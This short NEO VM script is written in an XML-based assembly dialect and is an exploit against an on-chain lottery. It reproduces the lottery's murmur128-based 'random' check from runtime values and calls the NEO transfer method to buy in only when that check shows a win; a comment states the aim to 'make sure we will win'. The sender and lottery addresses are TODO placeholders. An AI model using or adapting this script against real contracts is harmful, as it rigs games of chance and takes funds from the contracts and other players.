<lazy xmlns:a="Assembly" xmlns:b="Basic">
    <!-- NEOVM v3.2.0 --> 
    <!-- NEO v3.2.1 -->
    <!-- NEONODE v3.2.1 --> 
    <!-- NEOMODULES v3.2.1 -->
    <b:func name="main">
        <b:var name="tmp" />
        <b:var name="rand" />

        <a:syscall name= "System.Runtime.GetRandom" />
        <b:save type="var" name="rand" />

        <a:int val="10" /> <!-- try at most 10 times -->
        <b:save type="var" name="tmp" />
        <b:dowhile type="var" name="tmp">

            <b:load type="var" name="rand" />
            <a:syscall name= "System.Runtime.GetNetwork" />
            <a:int val="2" />
            <pack /> <!-- pack the 2 params for murmur128 -->
            <a:contractcall hash="0x726cb6e0cd8628a1350a611384688911ab75f51b" method="murmur128" /> <!-- cryptolib -->
            <a:int val="2" />
            <mod /> <!-- test if murmur128(rand, network)%2 == 1, make sure we will win the lotery -->
            <a:if>
                <a:bytes val="04b878c2d8d907ecf1d718990f903867c592a113" /> <!-- TODO from = our address in little endian -->
                <a:bytes val="04b878c2d8d907ecf1d718990f903867c592a113" /> <!-- TODO to = lottery address in little endian -->
                <a:int val="1" /> <!-- amount = 1-->
                <pushnull /> <!-- data = null -->
                <a:int val="4" />
                <pack />  <!-- pack the 4 params for neo transfer -->
                <a:contractcall hash="0xef4073a0f2b305a38ec4050e4d3d28bc40ea63f5" method="transfer" /> <!-- call NEO transfer -->
                <b:return />
            </a:if>
            
            <b:load type="var" name="tmp" />
            <dec />
            <b:save type="var" name="tmp" />
        </b:dowhile>
        <b:return />
    </b:func>
</lazy>